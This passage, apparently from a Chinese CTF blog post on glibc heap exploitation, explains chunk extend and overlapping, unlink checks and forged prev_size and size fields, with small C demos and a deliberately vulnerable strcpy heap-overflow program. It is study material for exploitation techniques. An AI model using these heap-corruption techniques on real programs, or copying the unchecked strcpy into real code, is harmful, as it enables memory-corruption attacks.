+<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">获取chunk块的大小</span><br><span class="line"><span class="comment">/* Get size, ignoring use bits */</span></span><br><span class="line"><span class="selector-id">#define</span> <span class="built_in">chunksize</span>(p) (chunksize_nomask(p) &amp; ~(SIZE_BITS))</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Like chunksize, but do not mask SIZE_BITS.  */</span></span><br><span class="line"><span class="selector-id">#define</span> <span class="built_in">chunksize_nomask</span>(p) ((p)-&gt;mchunk_size)</span><br><span class="line">获取下一块chunk大小</span><br><span class="line"><span class="comment">/* Ptr to next physical malloc_chunk. */</span></span><br><span class="line"><span class="selector-id">#define</span> <span class="built_in">next_chunk</span>(p) ((mchunkptr)(((char *) (p)) + <span class="built_in">chunksize</span>(p)))</span><br><span class="line">获取前一个chunk信息的操作</span><br><span class="line"><span class="comment">/* Size of the chunk below P.  Only valid if prev_inuse (P).  */</span></span><br><span class="line"><span class="selector-id">#define</span> <span class="built_in">prev_size</span>(p) ((p)-&gt;mchunk_prev_size)</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Ptr to previous physical malloc_chunk.  Only valid if prev_inuse (P).  */</span></span><br><span class="line"><span class="selector-id">#define</span> <span class="built_in">prev_chunk</span>(p) ((mchunkptr)(((char *) (p)) - <span class="built_in">prev_size</span>(p)))</span><br><span class="line">判断chunk是否处于use状态</span><br><span class="line"><span class="selector-id">#define</span> <span class="built_in">inuse</span>(p)</span><br><span class="line">    ((((mchunkptr)(((char *) (p)) + <span class="built_in">chunksize</span>(p)))-&gt;mchunk_size) &amp; PREV_INUSE)</span><br></pre></td></tr></table></figure>
+
+<p>总而言之，ptmalloc通过chunk header的数据判断chunk的使用核对chunk的前后块定位，那么就可用chunk extend 就是通过控制size和pre_size实现跨块操作，导致overlapping。</p>
+<p>具体说明：</p>
+<p>1、对inuse的fastbin的extend</p>
+<p>创建两个chunk（0x10），修改第一个chunk的size使得size&#x3D;chunk1.size+chunk2.size，这时候free（chunk1），发现chunk1和chunk2合成了一个chunk进行释放，接下来再通过malloc就可以得到chunk1+chunk2，取得chunk2中的内容，这种状态叫做overlapping chunk。</p>
+<p>2、对inuse的smallbin的extend</p>
+<p>因为处于fastbin范围内的chunk释放后会放入fastbin链表（最大是0x70），不处于这个范围内的chunk会进入unsortedbin，创建一个0x80的chunk和0x10的chunk，将0x80的size改为0xb1，然后free，chunk1和chunk2会吞入unsorted bin，如果malloc（0xa0）就会取出chunk1和chunk2</p>
+<p>3、对free的smallbin进行extend</p>
+<p>与2一样，但这次先free（chunk1），然后再修改size，chunk1在free后会进入unsortedbin，然后改size，接下来再malloc就可以得到chunk1+chunk2</p>
+<p>一般来说，这种技术并不能直接控制程序的执行流程，但是可以控制 chunk 中的内容。如果 chunk 存在字符串指针、函数指针等，就可以利用这些指针来进行信息泄漏和控制执行流程。</p>
+<p>此外通过 extend 可以实现 chunk overlapping，通过 overlapping 可以控制 chunk 的 fd&#x2F;bk 指针从而可以实现 fastbin attack 等利用。</p>
+<p>4、通过extend后向overlapping</p>
+<p>进行4次malloc（0x10），然后把第一个的size改成0x61，然后free，接下来malloc（0x50），其中 0x10 的 fastbin 块依然可以正常的分配和释放，此时已经构成 overlapping，通过对 overlapping 的进行操作可以实现 fastbin attack。</p>
+<p>5、通过extend向前overlapping</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">void</span> *ptr1,*ptr2,*ptr3,*ptr4;</span><br><span class="line">    ptr1=<span class="built_in">malloc</span>(<span class="number">128</span>);<span class="comment">//smallbin1</span></span><br><span class="line">    ptr2=<span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//fastbin1</span></span><br><span class="line">    ptr3=<span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//fastbin2</span></span><br><span class="line">    ptr4=<span class="built_in">malloc</span>(<span class="number">128</span>);<span class="comment">//smallbin2</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//防止与top合并</span></span><br><span class="line">    <span class="built_in">free</span>(ptr1);</span><br><span class="line">    *(<span class="type">int</span> *)((<span class="type">long</span> <span class="type">long</span>)ptr4<span class="number">-0x8</span>)=<span class="number">0x90</span>;<span class="comment">//修改pre_inuse域</span></span><br><span class="line">    *(<span class="type">int</span> *)((<span class="type">long</span> <span class="type">long</span>)ptr4<span class="number">-0x10</span>)=<span class="number">0xd0</span>;<span class="comment">//修改pre_size域</span></span><br><span class="line">    <span class="built_in">free</span>(ptr4);<span class="comment">//unlink进行前向extend</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x150</span>);<span class="comment">//占位块</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>前向 extend 利用了 smallbin 的 unlink 机制，通过修改 pre_size 域可以跨越多个 chunk 进行合并实现 overlapping。</p>
+<h2 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h2><p>unlink其实就是将双向链表中的free块拿出来，运用漏洞时就是修改chunk的内存布局，借助unlink操作修改指针</p>
+<p><img src="/../../../Users/86159/AppData/Roaming/Typora/typora-user-images/image-20230331190125023.png" alt="image-20230331190125023"></p>
+<p>程序进行unlink时进行检查操作</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 由于&#x27;P&#x27;已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致(size检查)</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);        </span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查 fd 和 bk 指针(双向链表完整性检查)</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))</span><br><span class="line">    malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);  </span><br><span class="line"></span><br><span class="line"> <span class="comment">// 检查 largebin 中 next_size 双向链表完整性检查 </span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>) || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))    </span><br><span class="line">    malloc_printerr (check_action,<span class="string">&quot;corrupted double-linked list (not small)&quot;</span>, P, AV);</span><br></pre></td></tr></table></figure>
+
+<p>就是指：</p>
+<p>chunkP的下一个chunk的上一个chunk是不是chunkP</p>
+<p>chunkP的上一个chunk的下一个chunk是不是chunkP‘9</p>
+<p>攻击原理：</p>
+<p>unlink的检查不是那么完美，只会根据相对地址来检查，他始终会认为chunk_head + 0x8的位置presize</p>
+<p>所以可以用来欺骗程序</p>
+<p>如何利用？</p>
+<p>首先要知道堆创建后，如果free，他仍然会保留在那个位置，数据不会被抹除，只是size的p位被改变，然后要知道如果一个chunk被释放，会检查这个chunk相邻的chunk是否为free状态，如果free则要进行合并（向前和向后合并），合并时需要将空闲chunk从原来bin中unlink，并将合并后的chunk放入unsorted bin中。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span>&#123;</span><br><span class="line">    <span class="type">char</span> *first, *second;</span><br><span class="line">    first = <span class="built_in">malloc</span>(<span class="number">666</span>);</span><br><span class="line">    second = <span class="built_in">malloc</span>(<span class="number">12</span>);</span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">1</span>)</span><br><span class="line">        <span class="built_in">strcpy</span>(first, argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">free</span>(first);</span><br><span class="line">    <span class="built_in">free</span>(second);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/12/21/2022-RCTF/" rel="prev" title="2022-RCTF">
+      <i class="fa fa-chevron-left"></i> 2022-RCTF
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2023/03/23/ret2xxx/" rel="next" title="ret2xxx">
+      ret2xxx <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#pwn2heap"><span class="nav-text">pwn2heap</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A0%86%E7%9A%84%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="nav-text">堆的基础知识</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A0%86%E7%9A%84%E7%BB%93%E6%9E%84"><span class="nav-text">堆的结构</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#malloc-chunk"><span class="nav-text">malloc_chunk</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#bin"><span class="nav-text">bin</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#fastbin%EF%BC%88lifo%EF%BC%89"><span class="nav-text">fastbin（lifo）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#smallbin%EF%BC%88fifo%EF%BC%89"><span class="nav-text">smallbin（fifo）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#largebin"><span class="nav-text">largebin</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#unsortedbin%EF%BC%88fifio%EF%BC%89"><span class="nav-text">unsortedbin（fifio）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#top-chunk"><span class="nav-text">top chunk</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#last-remainder"><span class="nav-text">last remainder</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#UNLINK"><span class="nav-text">UNLINK</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A0%86%E6%BA%A2%E5%87%BA"><span class="nav-text">堆溢出</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Off-By-One"><span class="nav-text">Off-By-One</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#chunk-extend-and-overlapping"><span class="nav-text">chunk extend and overlapping</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#unlink"><span class="nav-text">unlink</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="bj777"
+      src="/images/bitbug_favicon.ico">
+  <p class="site-author-name" itemprop="name">bj777</p>
+  <div class="site-description" itemprop="description">一位逆向菜狗</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">41</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/jonathanbest7" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;jonathanbest7" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/506611735@qq.com" title="E-Mail → 506611735@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://www.zhihu.com/people/bang-ji-1" title="知乎 → https:&#x2F;&#x2F;www.zhihu.com&#x2F;people&#x2F;bang-ji-1" rel="noopener" target="_blank"><i class="fab fa-zhihu fa-fw"></i>知乎</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">bj777</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+		<canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+		<script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+		<script type="text/javascript" src="/js/src/fireworks.js"></script>
+  
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"right","width":300,"height":600},"mobile":{"show":false},"rect":"opacity:0.7","log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
